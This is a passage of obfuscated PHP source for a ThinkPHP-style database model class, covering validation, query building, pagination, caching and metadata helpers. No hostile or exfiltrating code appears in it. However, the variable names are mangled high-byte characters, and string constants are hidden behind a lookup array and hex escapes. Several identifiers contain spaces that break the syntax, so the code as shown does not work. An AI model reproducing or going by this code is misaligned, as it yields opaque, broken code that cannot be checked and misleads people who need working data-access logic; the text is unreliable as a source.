isset($úùÏ[3]) ? $úùÏ[3] : THINK_EXISTS_VALIDATE; $úùÏ[4] = isset($úùÏ[4]) ? $úùÏ[4] : $‡àÛ±úŸ[380]; switch ($úùÏ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($êÚÉÍ•¤, $úùÏ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($‡àÛ±úŸ[12] != trim($êÚÉÍ•¤[$úùÏ[0]])) { if (!1 === $this->_validationField($êÚÉÍ•¤, $úùÏ)) { return !1; } } break; default: if (isset($êÚÉÍ•¤[$úùÏ[0]])) { if (!1 === $this->_validationField($êÚÉÍ•¤, $úùÏ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($¦ĞªÑ´ñ, $ı»¹îû) { if (!1 === $this->_validationFieldItem($¦ĞªÑ´ñ, $ı»¹îû)) { if ($this->patchValidate) { $this->error[$ı»¹îû[0]] = $ı»¹îû[2]; } else { $this->error = $ı»¹îû[2]; return !1; } } return; } protected function _validationFieldItem($”¥°•ºú, $ÉúÇÛ÷) { $¤ÉÄ—°Õ =& $_SERVER[ˆûùúÊ¯]; switch (strtolower(trim($ÉúÇÛ÷[4]))) { case $¤ÉÄ—°Õ[373]: case $¤ÉÄ—°Õ[374]: $·¤÷°—â = isset($ÉúÇÛ÷[6]) ? (array) $ÉúÇÛ÷[6] : array(); if (is_string($ÉúÇÛ÷[0]) && strpos($ÉúÇÛ÷[0], $¤ÉÄ—°Õ[60])) { $ÉúÇÛ÷[0] = explode($¤ÉÄ—°Õ[60], $ÉúÇÛ÷[0]); } if (is_array($ÉúÇÛ÷[0])) { foreach ($ÉúÇÛ÷[0] as $½çõ¬Î·) { $¡€Àò·ø[$½çõ¬Î·] = $”¥°•ºú[$½çõ¬Î·]; } array_unshift($·¤÷°—â, $¡€Àò·ø); } else { array_unshift($·¤÷°—â, $”¥°•ºú[$ÉúÇÛ÷[0]]); } if ($¤ÉÄ—°Õ[373] == $ÉúÇÛ÷[4]) { return call_user_func_array($ÉúÇÛ÷[1], $·¤÷°—â); } else { return call_user_func_array(array(&$this, $ÉúÇÛ÷[1]), $·¤÷°—â); } case $¤ÉÄ—°Õ[381]: return $”¥°•ºú[$ÉúÇÛ÷[0]] == $”¥°•ºú[$ÉúÇÛ÷[1]]; case $¤ÉÄ—°Õ[382]: if (is_string($ÉúÇÛ÷[0]) && strpos($ÉúÇÛ÷[0], $¤ÉÄ—°Õ[60])) { $ÉúÇÛ÷[0] = explode($¤ÉÄ—°Õ[60], $ÉúÇÛ÷[0]); } $š ÎÀùÕ = array(); if (is_array($ÉúÇÛ÷[0])) { foreach ($ÉúÇÛ÷[0] as $½çõ¬Î·) { $š ÎÀùÕ[$½çõ¬Î·] = $”¥°•ºú[$½çõ¬Î·]; } } else { $š ÎÀùÕ[$ÉúÇÛ÷[0]] = $”¥°•ºú[$ÉúÇÛ÷[0]]; } if (!empty($”¥°•ºú[$this->getPk()])) { $š ÎÀùÕ[$this->getPk()] = array($¤ÉÄ—°Õ[383], $”¥°•ºú[$this->getPk()]); } if ($this->where($š ÎÀùÕ)->find()) { return !1; } return !0; default: return $this->check($”¥°•ºú[$ÉúÇÛ÷[0]], $ÉúÇÛ÷[1], $ÉúÇÛ÷[4]); } } public function check($ÒšÎ¨¬æ, $ãé¼¦ß§, $Î“ÎŒ« = "\x72\x65\x67\145\170") { $¸ªÈˆ =& $_SERVER[ˆûùúÊ¯]; $Î“ÎŒ« = strtolower(trim($Î“ÎŒ«)); switch ($Î“ÎŒ«) { case $¸ªÈˆ[7]: case $¸ªÈˆ[384]: $ÏàâÊóˆ = is_array($ãé¼¦ß§) ? $ãé¼¦ß§ : explode($¸ªÈˆ[60], $ãé¼¦ß§); return $Î“ÎŒ« == $¸ªÈˆ[7] ? in_array($ÒšÎ¨¬æ, $ÏàâÊóˆ) : !in_array($ÒšÎ¨¬æ, $ÏàâÊóˆ); case $¸ªÈˆ[385]: case $¸ªÈˆ[386]: if (is_array($ãé¼¦ß§)) { $î“üØ¢ = $ãé¼¦ß§[0]; $ÚœûÕö‹ = $ãé¼¦ß§[1]; } else { list($î“üØ¢, $ÚœûÕö‹) = explode($¸ªÈˆ[60], $ãé¼¦ß§); } return $Î“ÎŒ« == $¸ªÈˆ[385] ? $ÒšÎ¨¬æ >= $î“üØ¢ && $ÒšÎ¨¬æ <= $ÚœûÕö‹ : $ÒšÎ¨¬æ < $î“üØ¢ || $ÒšÎ¨¬æ > $ÚœûÕö‹; case $¸ªÈˆ[387]: case $¸ªÈˆ[388]: return $Î“ÎŒ« == $¸ªÈˆ[387] ? $ÒšÎ¨¬æ == $ãé¼¦ß§ : $ÒšÎ¨¬æ != $ãé¼¦ß§; case $¸ªÈˆ[389]: $ÓÖû…Öğ = mb_strlen($ÒšÎ¨¬æ, $¸ªÈˆ[390]); if (strpos($ãé¼¦ß§, $¸ªÈˆ[60])) { list($î“üØ¢, $ÚœûÕö‹) = explode($¸ªÈˆ[60], $ãé¼¦ß§); return $ÓÖû…Öğ >= $î“üØ¢ && $ÓÖû…Öğ <= $ÚœûÕö‹; } else { return $ÓÖû…Öğ == $ãé¼¦ß§; } case $¸ªÈˆ[391]: list($›Èˆ¹‹ë, $˜şÈÉÏ°) = explode($¸ªÈˆ[60], $ãé¼¦ß§); if (!is_numeric($›Èˆ¹‹ë)) { $›Èˆ¹‹ë = strtotime($›Èˆ¹‹ë); } if (!is_numeric($˜şÈÉÏ°)) { $˜şÈÉÏ° = strtotime($˜şÈÉÏ°); } return NOW_TIME >= $›Èˆ¹‹ë && NOW_TIME <= $˜şÈÉÏ°; case $¸ªÈˆ[392]: return in_array(get_client_ip(), explode($¸ªÈˆ[60], $ãé¼¦ß§)); case $¸ªÈˆ[393]: return !in_array(get_client_ip(), explode($¸ªÈˆ[60], $ãé¼¦ß§)); case $¸ªÈˆ[380]: default: return $this->regex($ÒšÎ¨¬æ, $ãé¼¦ß§); } } public function query($Éæƒ¸¦, $Ş™÷ÄÈæ = false) { $Ñö·Ö¼ =& $_SERVER[ˆûùúÊ¯]; if (!is_bool($Ş™÷ÄÈæ) && !is_array($Ş™÷ÄÈæ)) { $Ş™÷ÄÈæ = func_get_args(); array_shift($Ş™÷ÄÈæ); } $Éæƒ¸¦ = str_replace(array($Ñö·Ö¼[18], $Ñö·Ö¼[394]), $Ñö·Ö¼[63], $Éæƒ¸¦); $Éæƒ¸¦ = $this->parseSql($Éæƒ¸¦, $Ş™÷ÄÈæ); return $this->db->query($Éæƒ¸¦); } public function execute($ä£÷”Ëõ, $ŠëüÃâş = false) { if (!is_bool($ŠëüÃâş) && !is_array($ŠëüÃâş)) { $ŠëüÃâş = func_get_args(); array_shift($ŠëüÃâş); } $ä£÷”Ëõ = $this->parseSql($ä£÷”Ëõ, $ŠëüÃâş); return $this->db->execute($ä£÷”Ëõ); } protected function parseSql($±Õ ¦Â, $£˜ÂÖ¯Ï) { $®úø™ÄÇ =& $_SERVER[ˆûùúÊ¯]; if (!0 === $£˜ÂÖ¯Ï) { $ışŸ†¹¼ = $this->_parseOptions(); $±Õ ¦Â = $this->db->parseSql($±Õ ¦Â, $ışŸ†¹¼); } elseif (is_array($£˜ÂÖ¯Ï)) { $£˜ÂÖ¯Ï = array_map(array($this->db, $®úø™ÄÇ[395]), $£˜ÂÖ¯Ï); $±Õ ¦Â = vsprintf($±Õ ¦Â, $£˜ÂÖ¯Ï); } else { $±Õ ¦Â = strtr($±Õ ¦Â, array($®úø™ÄÇ[396] => $this->getTableName(), $®úø™ÄÇ[397] => think_config($®úø™ÄÇ[296]))); } $this->db->setModel($this->name); return $±Õ ¦Â; } public function db($”Çüí…Ê = '', $‰üĞÙ×‘ = '', $…³óÂ½ƒ = array()) { $ÙÉÎõ½¥ =& $_SERVER[ˆûùúÊ¯]; if ($ÙÉÎõ½¥[12] === $”Çüí…Ê && $this->db) { return $this->db; } static $‘‹É¾Û£ = array(); static $‹×Òˆ¥° = array(); if (!isset($‹×Òˆ¥°[$”Çüí…Ê]) || isset($‹×Òˆ¥°[$”Çüí…Ê]) && $‰üĞÙ×‘ && $‘‹É¾Û£[$”Çüí…Ê] != $‰üĞÙ×‘) { if (!empty($‰üĞÙ×‘) && is_string($‰üĞÙ×‘) && !1 === strpos($‰üĞÙ×‘, $ÙÉÎõ½¥[8])) { $‰üĞÙ×‘ = think_config($‰üĞÙ×‘); } $”Çüí…Ê = think_guid($‰üĞÙ×‘); $‹×Òˆ¥°[$”Çüí…Ê] = Db::getInstance($‰üĞÙ×‘); } elseif (NULL === $‰üĞÙ×‘) { $‹×Òˆ¥°[$”Çüí…Ê]->close(); unset($‹×Òˆ¥°[$”Çüí…Ê]); return; } if (!empty($…³óÂ½ƒ)) { if (is_string($…³óÂ½ƒ)) { parse_str($…³óÂ½ƒ, $…³óÂ½ƒ); } foreach ($…³óÂ½ƒ as $óúâà’û => $¦Ğßå½‚) { $this->setProperty($óúâà’û, $¦Ğßå½‚); } } $‘‹É¾Û£[$”Çüí…Ê] = $‰üĞÙ×‘; $this->db = $‹×Òˆ¥°[$”Çüí…Ê]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $ŸŞ£»‹ê = get_class($this); if ($ŸŞ£»‹ê == $_SERVER[ˆûùúÊ¯][398]) { return $this->name; } $this->name = substr($ŸŞ£»‹ê, 0, -5); } return $this->name; } public function getTableName() { $•Ã°Ï²õ =& $_SERVER[ˆûùúÊ¯]; if (empty($this->trueTableName)) { $ƒ¼‡Èª = !empty($this->tablePrefix) ? $this->tablePrefix : $•Ã°Ï²õ[12]; if (!empty($this->tableName)) { $ƒ¼‡Èª .= $this->tableName; } else { $ƒ¼‡Èª .= think_parse_name($this->name); } $this->trueTableName = strtolower($ƒ¼‡Èª); } return (!empty($this->dbName) ? $this->dbName . $•Ã°Ï²õ[10] : $•Ã°Ï²õ[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $´ÖÌã ğ =& $_SERVER[ˆûùúÊ¯]; return isset($this->fields[$´ÖÌã ğ[303]]) ? $this->fields[$´ÖÌã ğ[303]] : $this->pk; } public function getDbFields() { $íâ«ÜõÆ =& $_SERVER[ˆûùúÊ¯]; if (isset($this->options[$íâ«ÜõÆ[331]])) { $èéõ””é = $this->db->getFields($this->options[$íâ«ÜõÆ[331]]); return $èéõ””é ? array_keys($èéõ””é) : !1; } if ($this->fields) { $èéõ””é = $this->fields; unset($èéõ””é[$íâ«ÜõÆ[302]], $èéõ””é[$íâ«ÜõÆ[303]], $èéõ””é[$íâ«ÜõÆ[304]], $èéõ””é[$íâ«ÜõÆ[301]]); return $èéõ””é; } return !1; } public function data($æÇê‘ŒŒ = '') { $ˆÎƒÁ±µ =& $_SERVER[ˆûùúÊ¯]; if ($ˆÎƒÁ±µ[12] === $æÇê‘ŒŒ && !empty($this->data)) { return $this->data; } if (is_object($æÇê‘ŒŒ)) { $æÇê‘ŒŒ = get_object_vars($æÇê‘ŒŒ); } elseif (is_string($æÇê‘ŒŒ)) { parse_str($æÇê‘ŒŒ, $æÇê‘ŒŒ); } elseif (!is_array($æÇê‘ŒŒ)) { think_exception(think_lang($ˆÎƒÁ±µ[323])); } $this->data = $æÇê‘ŒŒ; return $this; } public function join($ÀÜ‡‚ÒÁ) { $–¼ü‹Ì§ =& $_SERVER[ˆûùúÊ¯]; if (is_array($ÀÜ‡‚ÒÁ)) { $this->options[$–¼ü‹Ì§[334]] = $ÀÜ‡‚ÒÁ; } elseif (!empty($ÀÜ‡‚ÒÁ)) { $this->options[$–¼ü‹Ì§[334]][] = $ÀÜ‡‚ÒÁ; } return $this; } public function union($â¸€€şÑ, $Ãü„ßÔ¨ = false) { $¥¥ãú =& $_SERVER[ˆûùúÊ¯]; if (empty($â¸€€şÑ)) { return $this; } if ($Ãü„ßÔ¨) { $this->options[$¥¥ãú[399]][$¥¥ãú[400]] = !0; } if (is_object($â¸€€şÑ)) { $â¸€€şÑ = get_object_vars($â¸€€şÑ); } if (is_string($â¸€€şÑ)) { $É‘ëóÍ† = $â¸€€şÑ; } elseif (is_array($â¸€€şÑ)) { if (isset($â¸€€şÑ[0])) { $this->options[$¥¥ãú[399]] = array_merge($this->options[$¥¥ãú[399]], $â¸€€şÑ); return $this; } else { $É‘ëóÍ† = $â¸€€şÑ; } } else { think_exception(think_lang($¥¥ãú[323])); } $this->options[$¥¥ãú[399]][] = $É‘ëóÍ†; return $this; } public function cache($Œ¨¸í™× = true, $’”÷ Ö¡ = null, $ÇÖıœÄ = '') { $¼¥üÔ·· =& $_SERVER[ˆûùúÊ¯]; if (!1 !== $Œ¨¸í™×) { $this->options[$¼¥üÔ··[401]] = array($¼¥üÔ··[104] => $Œ¨¸í™×, $¼¥üÔ··[391] => $’”÷ Ö¡, $¼¥üÔ··[43] => $ÇÖıœÄ); } return $this; } public function field($÷´Ëšû , $ÕÄ´ù¶Ï = false) { $¿ğòòÉñ =& $_SERVER[ˆûùúÊ¯]; if (!0 === $÷´Ëšû ) { $ÇŞÑå‚„ = $this->getDbFields(); $÷´Ëšû  = $ÇŞÑå‚„ ? $ÇŞÑå‚„ : $¿ğòòÉñ[212]; } elseif ($ÕÄ´ù¶Ï) { if (is_string($÷´Ëšû )) { $÷´Ëšû  = explode($¿ğòòÉñ[60], $÷´Ëšû ); } $ÇŞÑå‚„ = $this->getDbFields(); $÷´Ëšû  = $ÇŞÑå‚„ ? array_diff($ÇŞÑå‚„, $÷´Ëšû ) : $÷´Ëšû ; } $this->options[$¿ğòòÉñ[325]] = $÷´Ëšû ; return $this; } public function scope($ÔŒÏÂÆÎ = '', $£œ‰ş®˜ = NULL) { $é¥¸Í§„ =& $_SERVER[ˆûùúÊ¯]; if ($é¥¸Í§„[12] === $ÔŒÏÂÆÎ) { if (isset($this->_scope[$é¥¸Í§„[47]])) { $ö‘·”© = $this->_scope[$é¥¸Í§„[47]]; } else { return $this; } } elseif (is_string($ÔŒÏÂÆÎ)) { $µ·µ¨ñÛ = explode($é¥¸Í§„[60], $ÔŒÏÂÆÎ); $ö‘·”© = array(); foreach ($µ·µ¨ñÛ as $çŒ—ª­¯) { if (!isset($this->_scope[$çŒ—ª­¯])) { continue; } $ö‘·”© = array_merge($ö‘·”©, $this->_scope[$çŒ—ª­¯]); } if (!empty($£œ‰ş®˜) && is_array($£œ‰ş®˜)) { $ö‘·”© = array_merge($ö‘·”©, $£œ‰ş®˜); } } elseif (is_array($ÔŒÏÂÆÎ)) { $ö‘·”© = $ÔŒÏÂÆÎ; } if (is_array($ö‘·”©) && !empty($ö‘·”©)) { $this->options = array_merge($this->options, array_change_key_case($ö‘·”©)); } return $this; } public function where($ŞÁÉëñ, $ëøüà´´ = null) { $Îñéˆ½† =& $_SERVER[ˆûùúÊ¯]; if (!is_null($ëøüà´´) && is_string($ŞÁÉëñ)) { if (!is_array($ëøüà´´)) { $ëøüà´´ = func_get_args(); array_shift($ëøüà´´); } $ëøüà´´ = array_map(array($this->db, $Îñéˆ½†[395]), $ëøüà´´); $ŞÁÉëñ = vsprintf($ŞÁÉëñ, $ëøüà´´); } elseif (is_object($ŞÁÉëñ)) { $ŞÁÉëñ = get_object_vars($ŞÁÉëñ); } elseif (is_array($ŞÁÉëñ)) { foreach ($ŞÁÉëñ as $¥Í‘Â›­ => $•îŠÑİº) { if ((is_numeric($¥Í‘Â›­) || !$¥Í‘Â›­) && is_string($•îŠÑİº)) { if (strpos($•îŠÑİº, $Îñéˆ½†[402]) === 0) { continue; } think_trace($Îñéˆ½†[403], $Îñéˆ½†[12], $Îñéˆ½†[59]); die; } } } if (is_string($ŞÁÉëñ) && $Îñéˆ½†[12] != $ŞÁÉëñ) { $úÀå¼—‘ = array(); $úÀå¼—‘[$Îñéˆ½†[404]] = $ŞÁÉëñ; $ŞÁÉëñ = $úÀå¼—‘; } if (isset($this->options[$Îñéˆ½†[327]])) { $this->options[$Îñéˆ½†[327]] = array_merge($this->options[$Îñéˆ½†[327]], $ŞÁÉëñ); } else { $this->options[$Îñéˆ½†[327]] = $ŞÁÉëñ; } return $this; } public function limit($ÔÖ„Õùå, $ø‰ÓÖïì = null) { $œÊ‰ò†‚ =& $_SERVER[ˆûùúÊ¯]; $this->options[$œÊ‰ò†‚[344]] = is_null($ø‰ÓÖïì) ? $ÔÖ„Õùå : $ÔÖ„Õùå . $œÊ‰ò†‚[60] . $ø‰ÓÖïì; return $this; } public function page($°ğ²·¬¾, $ˆŸÏ¾Ú” = null) { $ÑêÕ×‡Ú =& $_SERVER[ˆûùúÊ¯]; $this->options[$ÑêÕ×‡Ú[405]] = is_null($ˆŸÏ¾Ú”) ? $°ğ²·¬¾ : $°ğ²·¬¾ . $ÑêÕ×‡Ú[60] . $ˆŸÏ¾Ú”; return $this; } public function comment($§ç»Â´) { $this->options[$_SERVER[ˆûùúÊ¯][406]] = $§ç»Â´; return $this; } public function setProperty($ÅßÆá Ù, $£”ßùõ¹) { if (property_exists($this, $ÅßÆá Ù)) { $this->{$ÅßÆá Ù} = $£”ßùõ¹; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\144\151\146\171\124\x69\x6d\145", "\164\x69\155\145", "\x69\x6e\x73\145\x72\x74\54\x75\x70\x64\x61\x74\145", "\x66\x75\156\143\x74\151\x6f\156"), array("\x63\x72\145\x61\164\145\x54\x69\x6d\145", "\164\x69\x6d\x65", "\151\156\163\145\162\x74", "\146\x75\x6e\143\164\x69\x6f\x6e")); public function setDataAuto($ÃÕÌÄÀ) { $this->dataAuto = $ÃÕÌÄÀ; } public function __construct($‘²Ë‹í = '', $¿¾ÊëŞ = '', $ª”ÎÆ ‰ = '') { parent::__construct($‘²Ë‹í, $¿¾ÊëŞ, $ª”ÎÆ ‰); } protected $tableMeta = array(); protected function _beforeInsert(&$ô‘Æ™¨­, $éœÌì½ã) { $Æ¦ùšàÅ =& $_SERVER[ˆûùúÊ¯]; if (!$this->checkDataAutoHas($Æ¦ùšàÅ[407])) { return; } $this->dataBeforeFilter($ô‘Æ™¨­, $Æ¦ùšàÅ[407]); } protected function _beforeUpdate(&$„¦õßÌ¸, $¤„– ‰Æ) { $»áÒµ™È =& $_SERVER[ˆûùúÊ¯]; if (!$this->checkDataAutoHas($»áÒµ™È[408])) { return; } $this->dataBeforeFilter($„¦õßÌ¸, $»áÒµ™È[408]); } protected function _afterSelect(&$ĞşàªÛ, $øš´Ï’) { if (!is_array($ĞşàªÛ)) { return; } if (!$this->checkDataAutoHas($_SERVER[ˆûùúÊ¯][409])) { return; } foreach ($ĞşàªÛ as &$ıàøÅÑ§) { $this->dataAfterFilter($ıàøÅÑ§); } unset($ıàøÅÑ§); } protected function _afterFind(&$íÛß¸Ç, $Ê ×ğ±Ã) { if (!is_array($íÛß¸Ç)) { return; } if (!$this->checkDataAutoHas($_SERVER[ˆûùúÊ¯][409])) { return; } $this->dataAfterFilter($íÛß¸Ç); } public static function textEncode($ Ã‡ã’¼) { if (!$ Ã‡ã’¼) { return $ Ã‡ã’¼; } $ Í†‹Û¸ = json_encode($ Ã‡ã’¼); $ Í†‹Û¸ = preg_replace_callback($_SERVER[ˆûùúÊ¯][410], function ($€¤ÎáÍ) { return addslashes($€¤ÎáÍ[0]); }, $ Í†‹Û¸); return json_decode($ Í†‹Û¸); } public static function textDecode($±å­Æ‘Ç) { $×ÕäŸ¥ =& $_SERVER[ˆûùúÊ¯]; $¢Ø¼ôÙµ = json_encode($±å­Æ‘Ç); $¢Ø¼ôÙµ = preg_replace_callback($×ÕäŸ¥[411], function ($ÁÛ÷˜ã‘) { return $_SERVER[ˆûùúÊ¯][107]; }, $¢Ø¼ôÙµ); return json_decode($¢Ø¼ôÙµ); } public function setAutoIncrement($ˆ·ïù¼æ) { $ÊìÙâµë = array($this->getPk() => $ˆ·ïù¼æ); $¼’íÑÉÚ = $this->data($ÊìÙâµë)->add(); if ($¼’íÑÉÚ) { $this->delete($¼’íÑÉÚ); } } public function getAutoIncrement() { $«œâ»‚¥ = $this->getTableName(); $­çÜ©ˆ” = $this->max($this->getPk()); $æ„ñÌşñ = $this->query("\163\x68\x6f\167\x20\164\x61\142\x6c\x65\40\x73\164\x61\164\165\x73\x20\167\150\145\162\x65\x20\x4e\141\155\x65\x3d\47{$«œâ»‚¥}\47"); $³Ä—ùÅ´ = $æ„ñÌşñ[0][$_SERVER[ˆûùúÊ¯][412]]; $şÚÉÛÙÊ = max($­çÜ©ˆ”, $³Ä—ùÅ´); return $şÚÉÛÙÊ; } protected function _callBefore($ı‚Ùü©Ğ, $÷¹îÍİ) { return $this->cacheCallCheck($ı‚Ùü©Ğ, $÷¹îÍİ, !1); } protected function _callAfter($Øì½Í¶æ, $²Áµ´‰») { return $this->cacheCallCheck($Øì½Í¶æ, $²Áµ´‰», !0); } protected function cacheFunctionAlias($ûÀ“’Š) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($ÎÑÚ›Ñû, $ú£Åúİæ, $‘Ğà×º¬ = false) { $¿ø…òòä = $this->cacheFunctionAlias($ú£Åúİæ); if (!$¿ø…òòä) { return; } foreach ($¿ø…òòä as $ëÜŒŸŸÓ => $À£š©úü) { $ƒ»×¦ëï = $À£š©úü[0]; $î¯ùµ¿é = explode($_SERVER[ˆûùúÊ¯][60], $À£š©úü[1]); if ($ÎÑÚ›Ñû == $ëÜŒŸŸÓ) { return $this->cacheFunctionGet($ëÜŒŸŸÓ, $ƒ»×¦ëï); } if ($‘Ğà×º¬ && in_array($ÎÑÚ›Ñû, $î¯ùµ¿é)) { $this->cacheFunctionClear($ëÜŒŸŸÓ, $ƒ»×¦ëï); } } } public function cacheFunctionGet($®îîùõ„, $‰æİ¦Æ) { $œ†¾¥‰­ = $this->cacheKeyMake($®îîùõ„, $‰æİ¦Æ); $Ø§œŒ€ = Cache::get($œ†¾¥‰­); if (!is_array($Ø§œŒ€)) { $Ø§œŒ€ = call_user_func_array(array($this, $®îîùõ„), array($‰æİ¦Æ, !0)); Cache::set($œ†¾¥‰­, $Ø§œŒ€); } return $Ø§œŒ€; } public function cacheFunctionClear($„°¢Ğ˜, $¹´’ù¢‡) { $Ó–¥ÑÅÈ = $¹´’ù¢‡; if (!is_array($¹´’ù¢‡)) { $Ó–¥ÑÅÈ = array($¹´’ù¢‡); } foreach ($Ó–¥ÑÅÈ as $–ã§Øñó) { $ŒØüğˆ = $this->cacheKeyMake($„°¢Ğ˜, $–ã§Øñó); Cache::remove($ŒØüğˆ); } } private function cacheKeyMake($ú³¼ÍÓƒ, $Â›Šş›Ï) { $‚Øƒá¶å =& $_SERVER[ˆûùúÊ¯]; return get_class($this) . $‚Øƒá¶å[11] . $ú³¼ÍÓƒ . $‚Øƒá¶å[413] . $Â›Šş›Ï; } protected function selectPageReset() { $óÙÁ¾ó =& $_SERVER[ˆûùúÊ¯]; if (isset($GLOBALS[$óÙÁ¾ó[414]])) { return; } $GLOBALS[$óÙÁ¾ó[414]] = isset($GLOBALS[$óÙÁ¾ó[7]][$óÙÁ¾ó[415]]) ? $GLOBALS[$óÙÁ¾ó[7]][$óÙÁ¾ó[415]] : !1; $GLOBALS[$óÙÁ¾ó[416]] = isset($GLOBALS[$óÙÁ¾ó[7]][$óÙÁ¾ó[405]]) ? $GLOBALS[$óÙÁ¾ó[7]][$óÙÁ¾ó[405]] : !1; $GLOBALS[$óÙÁ¾ó[7]][$óÙÁ¾ó[415]] = !1; $GLOBALS[$óÙÁ¾ó[7]][$óÙÁ¾ó[405]] = !1; } protected function selectPageRestore() { $òç×á¤Ì =& $_SERVER[ˆûùúÊ¯]; if (!isset($GLOBALS[$òç×á¤Ì[414]])) { return; } $GLOBALS[$òç×á¤Ì[7]][$òç×á¤Ì[415]] = $GLOBALS[$òç×á¤Ì[414]]; $GLOBALS[$òç×á¤Ì[7]][$òç×á¤Ì[405]] = $GLOBALS[$òç×á¤Ì[416]]; if ($GLOBALS[$òç×á¤Ì[7]][$òç×á¤Ì[415]] === !1) { unset($GLOBALS[$òç×á¤Ì[7]][$òç×á¤Ì[415]]); } if ($GLOBALS[$òç×á¤Ì[7]][$òç×á¤Ì[405]] === !1) { unset($GLOBALS[$òç×á¤Ì[7]][$òç×á¤Ì[405]]); } unset($GLOBALS[$òç×á¤Ì[414]]); unset($GLOBALS[$òç×á¤Ì[416]]); } protected function selectPage($¹¼€ÚÔı = 200, $ï—©À§ = 1) { $» Ê®¾Ê =& $_SERVER[ˆûùúÊ¯]; global $in; $„·¨¹Çˆ = $this->optionsValue(); $úã±õÄÃ = 50000; $¹¼€ÚÔı = isset($in[$» Ê®¾Ê[415]]) && $in[$» Ê®¾Ê[415]] ? $in[$» Ê®¾Ê[415]] : $¹¼€ÚÔı; if ($¹¼€ÚÔı === -1) { $in[$» Ê®¾Ê[415]] = !1; $úã±õÄÃ = 100000000; $¹¼€ÚÔı = $úã±õÄÃ; } $ØÉ¥¸µ = $„·¨¹Çˆ; $ØÉ¥¸µ[$» Ê®¾Ê[417]] = array(); $¹¼€ÚÔı = intval($¹¼€ÚÔı); $¹¼€ÚÔı = $¹¼€ÚÔı <= 5 ? 5 : ($¹¼€ÚÔı >= $úã±õÄÃ ? $úã±õÄÃ : $¹¼€ÚÔı); $ï—©À§ = intval(isset($in[$» Ê®¾Ê[405]]) && $in[$» Ê®¾Ê[405]] ? $in[$» Ê®¾Ê[405]] : $ï—©À§); $ï—©À§ = $ï—©À§ <= 1 ? 1 : $ï—©À§; $È ¹©şÈ = array(); $íĞ„ã¦ = 1; if ($ï—©À§ == 1 && $íĞ„ã¦) { $this->optionsValue($„·¨¹Çˆ); $È ¹©şÈ = $this->page($ï—©À§, $¹¼€ÚÔı)->select(); $ã¶â®â = is_array($È ¹©şÈ) ? count($È ¹©şÈ) : 0; if ($ã¶â®â < $¹¼€ÚÔı) { $ô§ºÒ³£ = 1; } else { $this->optionsValue($ØÉ¥¸µ); $ã¶â®â = intval($this->count()); $ô§ºÒ³£ = ceil($ã¶â®â / $¹¼€ÚÔı); } } else { $this->optionsValue($ØÉ¥¸µ); $ã¶â®â = intval($this->count()); $ô§ºÒ³£ = ceil($ã¶â®â / $¹¼€ÚÔı); $ï—©À§ = $ï—©À§ >= $ô§ºÒ³£ ? $ô§ºÒ³£ : $ï—©À§; $this->optionsValue($„·¨¹Çˆ); $È ¹©şÈ = $this->page($ï—©À§, $¹¼€ÚÔı)->select(); } if (!is_array($È ¹©şÈ)) { $È ¹©şÈ = array(); } if ($ô§ºÒ³£ == 1) { $ã¶â®â = count($È ¹©şÈ); } $òùàµ” = array($» Ê®¾Ê[418] => array($» Ê®¾Ê[419] => $ã¶â®â, $» Ê®¾Ê[415] => $¹¼€ÚÔı, $» Ê®¾Ê[405] => $ï—©À§, $» Ê®¾Ê[420] => $ô§ºÒ³£), $» Ê®¾Ê[421] => $È ¹©şÈ); return $òùàµ”; } protected function checkLength($Ìô´Å‚©, $ùË†ƒì = 0, $Şæ˜¸¥ = '') { $‘”ñÒ¢ß =& $_SERVER[ˆûùúÊ¯]; $ùË†ƒì = $ùË†ƒì ? $ùË†ƒì : 65536; if (!$Ìô´Å‚© || strlen($Ìô´Å‚©) < $ùË†ƒì) { return; } $Şæ˜¸¥ = $Şæ˜¸¥ ? $Şæ˜¸¥ . $‘”ñÒ¢ß[81] : $‘”ñÒ¢ß[12]; show_json($Şæ˜¸¥ . LNG($‘”ñÒ¢ß[422]) . "\x28{$ùË†ƒì}\51", !1); } protected function metaSet($ö²ãŸŠÍ, $¤€Ü³‚” = null, $³÷ó—Õø = null) { $‰—¬û„© =& $_SERVER[ˆûùúÊ¯]; if (!$this->tableMeta || !$ö²ãŸŠÍ) { return !1; } $ŸŸÀİ÷¶ = $this->tableMeta[$‰—¬û„©[423]]; $â–ôâ¢Ô = $this->tableMeta[$‰—¬û„©[424]]; $²ÓÛÓ = Model($â–ôâ¢Ô); $‘¯´íÑë = array($ŸŸÀİ÷¶ => $ö²ãŸŠÍ, $‰—¬û„©[425] => $¤€Ü³‚”); if (is_null($¤€Ü³‚”)) { return $²ÓÛÓ->where(array($ŸŸÀİ÷¶ => $ö²ãŸŠÍ))->delete(); } if (is_null($³÷ó—Õø) && is_string($¤€Ü³‚”)) { return $²ÓÛÓ->where($‘¯´íÑë)->delete(); } $ØÎƒ„•” = is_array($¤€Ü³‚”) ? $¤€Ü³‚” : array(); if (is_string($¤€Ü³‚”)) { $ØÎƒ„•”[$¤€Ü³‚”] = $³÷ó—Õø; } $Ëë¹’ = array(); foreach ($ØÎƒ„•” as $ˆçşÀ½ => $ÃúçøÜø) { if (is_null($ÃúçøÜø) && is_string($ˆçşÀ½)) { $²ÓÛÓ->where(array($ŸŸÀİ÷¶ => $ö²ãŸŠÍ, $‰—¬û„©[425] => $ˆçşÀ½))->delete(); continue; } $this->checkLength($ÃúçøÜø, !1, $â–ôâ¢Ô . $‰—¬û„©[4] . $ˆçşÀ½); $Ëë¹’[] = array($ŸŸÀİ÷¶ => $ö²ãŸŠÍ, $‰—¬û„©[104] => $ˆçşÀ½, $‰—¬û„©[426] => $ÃúçøÜø); } $Ğ“”» = $‰—¬û„©[427] . $â–ôâ¢Ô; CacheLock::lock($Ğ“”»); $²ÓÛÓ->where(array($ŸŸÀİ÷¶ => 